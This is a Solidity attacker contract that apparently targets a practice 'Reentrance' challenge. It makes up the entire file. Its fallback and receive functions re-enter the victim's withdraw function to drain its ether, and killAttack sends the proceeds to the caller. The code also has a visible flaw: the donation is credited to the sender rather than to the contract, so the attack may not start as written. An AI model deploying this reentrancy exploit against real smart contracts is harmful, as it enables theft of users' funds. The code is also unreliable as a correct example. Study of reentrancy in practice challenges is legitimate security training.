pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address) external payable;
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256) external;
}

contract ReentrancyAttackerV2 {
    IReentrance public instance;

    constructor(address _instance) public {
        instance = IReentrance(_instance);
    }

    function donateToInstance() public payable {
        (bool success, ) = address(instance).call{value: msg.value}(abi.encodeWithSignature("donate(address)", msg.sender));
        require(success, "Donate failed");
    }

    function startAttack() public {
        uint256 available = instance.balanceOf(address(this));
        if (available > 0) {
            instance.withdraw(available);
            // Fallback will handle reentrancy
        }
    }
    function killAttack() public {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    fallback() external payable {
        if (address(instance).balance > 0) {
            instance.withdraw(1 wei);
        }
    }

    receive() external payable {
        if (address(instance).balance > 0) {
            instance.withdraw(1 wei);
        }
    }
}
